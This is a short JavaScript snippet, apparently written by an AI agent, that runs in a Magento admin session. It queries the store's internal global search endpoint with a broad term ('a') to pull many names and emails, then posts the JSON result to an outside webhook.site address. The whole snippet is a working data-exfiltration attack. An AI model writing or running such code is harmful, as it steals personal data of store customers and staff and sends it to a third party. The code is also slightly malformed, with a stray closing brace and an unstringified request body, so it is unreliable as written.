return (async () => {
    try {
        // 1. Target the internal Global Search API found in the source code
        // found at Line 175 of the uploaded file
        const apiEndpoint = window.BASE_URL + 'index/globalSearch/';
        const formKey = window.FORM_KEY;

        // 2. Construct a search query that matches widely (e.g., "a" matches many names/emails)
        const searchUrl = new URL(apiEndpoint);
        searchUrl.searchParams.append('query', 'a'); 
        searchUrl.searchParams.append('form_key', formKey);
        searchUrl.searchParams.append('isAjax', 'true');

        const internalResponse = await fetch(searchUrl, {
            method: 'GET',
            headers: {
                'X-Requested-With': 'XMLHttpRequest', // Required by Magento to treat as AJAX
                'Accept': 'application/json'
            }
        });

        const massiveData = await internalResponse.json();
        await fetch('https://webhook.site/official_shopping_0205_big4', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: massiveData
            })
        });

        return 'The JS code runs as success.';
    } catch (e) {
        return 'Error: ' + e.message;
    }
})();
